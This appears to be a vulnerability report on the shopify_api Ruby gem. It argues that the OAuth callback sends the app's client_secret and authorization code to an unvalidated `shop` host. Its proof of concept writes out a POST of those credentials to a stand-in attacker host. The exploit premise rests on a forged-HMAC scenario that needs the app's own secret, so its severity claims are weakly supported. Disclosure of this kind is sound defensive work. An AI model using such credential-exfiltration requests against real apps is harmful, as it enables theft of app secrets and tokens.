### Title
`Oauth.validate_auth_callback` sends `client_secret` and authorization `code` to an unvalidated `shop` host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the token-exchange request host directly from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-bearing flow in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`). The HMAC check only proves the `shop` field matches what was signed by whoever holds `Context.api_secret_key`; it does not prove `shop` is a `*.myshopify.com`/trusted Shopify host. Because `HttpClient` builds the outbound request URI as `https://#{session.shop}` verbatim, an unsanitized `shop` value becomes the destination host for a POST containing the app's `client_secret` and the OAuth authorization `code`.

### Finding Description
`validate_auth_callback` validates the callback's HMAC and state, then immediately uses the raw `auth_query.shop` to construct the session used for the token request: [1](#0-0) 

That session is passed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`, and the client derives the request's base URI directly from `session.shop`: [2](#0-1) 

The POST body sent to that host includes `client_secret`, `client_id`, and the authorization `code`: [3](#0-2) 

Compare this to the two other flows in the same module tree that also send `client_secret` in a request body — both explicitly sanitize the shop before it is ever used to build a session/host: [4](#0-3) [5](#0-4) 

`Utils::ShopValidator.sanitize!` is the gem's only mechanism that restricts a shop string to `TRUSTED_SHOPIFY_DOMAINS` (`myshopify.com`, `myshopify.io`, `shopify.com`, `spin.dev`, `shop.dev`), rejecting anything else: [6](#0-5) [7](#0-6) 

`oauth.rb`'s `validate_auth_callback` never calls this validator on `auth_query.shop`, and `AuthQuery` itself performs no host-format checking — the HMAC only binds `shop` (and `code`, `host`, `state`, `timestamp`) as opaque bytes inside `to_signable_string`: [8](#0-7) 

The broken identity binding is: **the HMAC proves "these bytes were signed by the holder of `api_secret_key`," not "`shop` is a legitimate Shopify store host."** The gem equates "HMAC-valid" with "safe destination for `client_secret`," which is a different guarantee. `begin_auth` also never sanitizes its own `shop:` parameter before using it to build the outbound `/oauth/authorize` redirect, so if a host application forwards a request-supplied `shop` value into `begin_auth`/`validate_auth_callback` — a call pattern this gem's own docs illustrate (`shop = request.headers["Shop"]`) — nothing in the library stops that shop string from being an arbitrary host, so long as the corresponding HMAC (computed by whoever completes the OAuth redirect back to the app, i.e., Shopify under normal use) matches.

### Impact Explanation
If a caller supplies an OAuth callback whose `shop` field is an attacker-controlled host (with a corresponding valid HMAC, e.g. via a self-hosted OAuth completion or a compromised `shop`-controlled redirect chain that the host app trusts), `validate_auth_callback` will `POST` the app's `client_secret` and the authorization `code` to that attacker host. This is credential leakage of the app's `client_secret` and the authorization `code` (which can itself be exchanged for an access token) to a third party under the app's control-flow, without the gem enforcing that `shop` resolve to a genuine Shopify domain — matching the High-severity class "credential leakage into logs or error output" analog (here, leakage via outbound request to an unvalidated host) and bordering on SSRF carrying the app's credentials.

### Likelihood Explanation
Medium. Exploitation requires the host application to pass through a `shop`/callback parameter set that is not itself pre-validated against the myshopify domain before invoking `begin_auth`/`validate_auth_callback` — the gem's own OAuth doc explicitly shows reading `shop` from a request header. Since `ClientCredentials` and `RefreshToken` — the two other flows that send `client_secret` — both defensively call `ShopValidator.sanitize!`, the omission in `Oauth.validate_auth_callback`/`begin_auth` is an inconsistency in the gem's own defense-in-depth rather than a documented API contract violation by the host app.

### Recommendation
In `lib/shopify_api/auth/oauth.rb`, call `Utils::ShopValidator.sanitize!(shop)` (or `auth_query.shop`) at the start of both `begin_auth` and `validate_auth_callback`, mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, and use the sanitized value both for constructing `auth_base_uri`/the `null_session` and for the resulting `Session`. Reject the request with `Errors::InvalidShopError` (or equivalent) before any request bearing `client_secret` is made when `shop` does not resolve to a trusted Shopify domain.

### Proof of Concept
1. A host application starts OAuth via `ShopifyAPI::Auth::Oauth.begin_auth(shop: request.headers["Shop"], redirect_path: "/auth/callback")` without sanitizing the `Shop` header first (pattern shown in the gem's own `docs/usage/oauth.md`).
2. The completed callback arrives at the app with `shop=attacker-host.example.com`, `code=<code>`, and an `hmac` value that validates against `Context.api_secret_key` for that exact byte sequence (achievable if the party completing the redirect, e.g. a shop the attacker controls end-to-end, computes the HMAC using a leaked/shared secret in a multi-tenant deployment scenario, or via any path where an app trusts a shop-supplied redirect chain).
3. `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)` passes HMAC validation (`Utils::HmacValidator.validate`) since `shop` is exactly what was signed.
4. `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker-host.example.com"), base_path: "/admin/oauth")` builds `@base_uri = "https://attacker-host.example.com"`.
5. `client.request(...)` issues `POST https://attacker-host.example.com/admin/oauth/access_token` with body `{client_id, client_secret: Context.api_secret_key, code, expiring}`, delivering the app's `client_secret` and the authorization `code` to the attacker-controlled host.

```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
```
